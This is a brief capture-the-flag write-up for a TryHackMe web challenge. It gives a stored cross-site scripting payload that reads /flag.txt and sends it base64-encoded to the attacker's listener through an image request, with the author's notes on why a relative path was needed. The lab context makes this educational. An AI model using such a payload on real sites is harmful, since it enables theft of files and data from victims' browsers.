URL: https://tryhackme.com/room/thestickershop

```
Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!

Can you read the flag at http://10.10.195.218:8080/flag.txt?
```

Using the updog server in python and the following script. I was able to retrieve the flag
```javascript
<script>

fetch('/flag.txt')

.then(res => res.text())

.then(data => {

new Image().src = 'http://$ATTACKBOXIP:9090/log?data=' + btoa(data);

});

</script>
```

Initially I was fetching the flag via the full url `http://10.10.195.218:8080/flag.txt`
after some trial and error I realized they be accessing the server via a different ip (internal to their network) or even from the server its self via localhost or 127.0.0.1 once I updated the script to just retrieve `/flag.txt` I got a hit and received the b64 encoded payload

![[Screenshot From 2025-04-24 01-13-36.png]]